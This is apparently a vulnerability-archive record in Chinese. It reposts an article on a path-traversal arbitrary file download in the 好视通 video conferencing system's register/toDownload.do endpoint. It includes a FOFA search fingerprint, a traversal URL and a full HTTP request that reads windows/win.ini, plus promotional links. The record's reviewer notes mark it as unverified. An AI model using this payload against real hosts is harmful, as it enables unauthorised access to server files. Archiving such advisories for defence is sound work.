---
source: "MrWQ/vulnerability-paper"
title: "银澎云计算好视通视频会议 register/toDownload路径遍历下载"
product: "银澎云计算好视通视频会议"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "Windows，版本未知；0day为历史营销标题"
prerequisites: "样例含mldn-session-id，身份不明"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_url: "https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA"
source_status: "recorded"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE/%E9%93%B6%E6%BE%8E%E4%BA%91%E8%AE%A1%E7%AE%97%20%E5%A5%BD%E8%A7%86%E9%80%9A%E8%A7%86%E9%A2%91%E4%BC%9A%E8%AE%AE%E7%B3%BB%E7%BB%9F%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%20%280day%20%E6%9D%A5%E5%95%A6~%29.md"
fofa: "app=\"Hanming-Video-Conferencing\""
id: "vw-351840d0b1f3881f7a2ae731"
entity_id: "ve-351840d0b1f3881f7a2ae731"
schema_version: "1"
---

# 银澎云计算好视通视频会议 register/toDownload路径遍历下载

## 条目说明

- 对象与具体问题：银澎云计算好视通视频会议；register/toDownload路径遍历下载
- 版本、配置及部署条件：Windows，版本未知；0day为历史营销标题
- 认证与权限前提：样例含mldn-session-id，身份不明
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- FOFA Hanming-Video-Conferencing与好视通名不符需核产品指纹映射，避免误归汉明
- 0day需披露日期与修复时点，不能作为当前状态
- 去推广，补匿名对照、具体版本/补丁及返回文字

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/F-M21PT0xn9QOuwoC8llKA)

![](https://mmbiz.qpic.cn/mmbiz_gif/ibicicIH182el5PaBkbJ8nfmXVfbQx819qWWENXGA38BxibTAnuZz5ujFRic5ckEltsvWaKVRqOdVO88GrKT6I0NTTQ/640?wx_fmt=gif)

**公众号推荐**

**这个漏洞来自于 F12sec 的师傅，大家快快关注他们啦~**

公众号

**一****：漏洞描述🐑**

**银澎云计算 好视通视频会议系统 存在任意文件下载，攻击者可以通过漏洞获取敏感信息**

**二:  漏洞影响🐇**

**银澎云计算 好视通视频会议系统**

**三:  漏洞复现🐋**

```
FOFA: app="Hanming-Video-Conferencing"
```

**登录页面如下**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3L7ee0BUTWa7icBbabrHIQGn6ZXnMEaC2rmeYeLPaQ87g0xf9nknNN5A/640?wx_fmt=png)

**漏洞 Url 为**

```
https://xxx.xxx.xxx.xxx/register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini
```

**请求包为**  

```http
GET /register/toDownload.do?fileName=../../../../../../../../../../../../../../windows/win.ini HTTP/1.1
Host: xxx.xxx.xxx.xxx
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6
Cookie: mldn-session-id=7950aca4-6faa-46d9-858a-97b82d619741
Connection: close
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3QUjjWLYt3PO1JXGtbwlLww4HgkoA907OevIULD76z8IWurXb4VpiaUw/640?wx_fmt=png)

 ****四:  Goby & POC🦉****

```
Goby & POC 已经上传到 github 的 Goby & POC 目录
https://github.com/PeiQi0/PeiQi-WIKI-POC
```

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG3iaicXatMRKT6TYUHvt0pz8yFvOwUrP36S8d8vzlBsOqFrKcXdOEwZdsw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7u5y5KbaqpHBzTN4nGDKG368fHF3y8RSyqz9F8S30UnKUVs54HVFiayMaRZjkYqPHzmicKaZIciabmw/640?wx_fmt=png)

 ****五:  关于文库🦉****

**在线文库：**

**http://wiki.peiqi.tech**

**Github：**

**https://github.com/PeiQi0/PeiQi-WIKI-POC**

最后
--

> 下面就是文库的公众号啦，更新的文章都会在第一时间推送在交流群和公众号
> 
> 想要加入交流群的师傅公众号点击交流群加我拉你啦~
> 
> 别忘了 Github 下载完给个小星星⭐

公众号

**同时知识星球也开放运营啦，希望师傅们支持支持啦🐟**

**知识星球里会持续发布一些漏洞公开信息和技术文章~**

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuR3NABhn2DHwpXzWABBJnA6HSjGYhvbow9iaFIXZ5IUrST4EjoHojtlg/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuCFdyVD9UlKcV0COuXd5oajiacmB5LB71gLdCaEhRaiaicMTS8oq55s9pA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZu0SvJFXqSugecfEnJujNOic73ouoGndJPRvezpAstLqLJDqe6JqJsf2Q/640?wx_fmt=png)

---

> 来源：MrWQ/vulnerability-paper（https://github.com/MrWQ/vulnerability-paper）
